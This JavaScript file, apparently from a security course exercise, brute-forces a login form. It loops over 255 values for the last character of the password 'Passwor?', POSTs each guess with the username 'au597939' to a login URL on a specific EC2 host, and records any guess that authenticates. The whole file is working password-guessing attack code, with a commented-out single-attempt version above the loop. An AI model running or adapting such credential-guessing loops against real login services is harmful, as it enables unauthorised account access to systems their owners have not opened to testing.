var url = 'https://ec2-54-188-28-123.us-west-2.compute.amazonaws.com:8080/';
var uname = "au597939";

// var pass = "Password";
// var uname = "au597939";

// var formData = new FormData();
// formData.append('username', uname);
// formData.append('password', pass);

// fetch(url, {
//     method: 'POST',
//     body: formData
// }).then(res => {
//     var ok = res.ok;
//     if (ok) {
//         console.log("Authenticated correctly");
//     } else {
//         console.log("Not authenticated!");
//     }
// });

var log = [];
for (var i = 0; i < 0xff; i++) {
    let pass = "Passwor" + String.fromCodePoint(i);

    let formData = new FormData();
    formData.append('username', uname);
    formData.append('password', pass);

    fetch(url, {
        method: 'POST',
        body: formData
    }).then(res => {
        let ok = res.ok;
        if (ok) {
            log.push(pass)
        }
        console.log("Done");
    });
}